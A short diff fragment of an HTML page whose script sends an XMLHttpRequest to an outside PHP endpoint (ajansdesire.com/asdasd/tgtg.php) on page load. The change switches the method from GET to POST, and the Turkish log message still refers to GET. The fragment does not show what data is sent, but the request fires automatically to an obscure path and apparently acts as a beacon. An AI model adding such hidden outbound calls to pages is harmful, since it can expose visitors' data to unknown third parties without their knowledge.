@@ -181,7 +181,7 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
  
         window.addEventListener('load', function() {
             var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://ajansdesire.com/asdasd/tgtg.php', true);
+            xhr.open('POST', 'https://ajansdesire.com/asdasd/tgtg.php', true);
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == 4 && xhr.status == 200) {
                     console.log('GET isteği başarıyla gönderildi.');
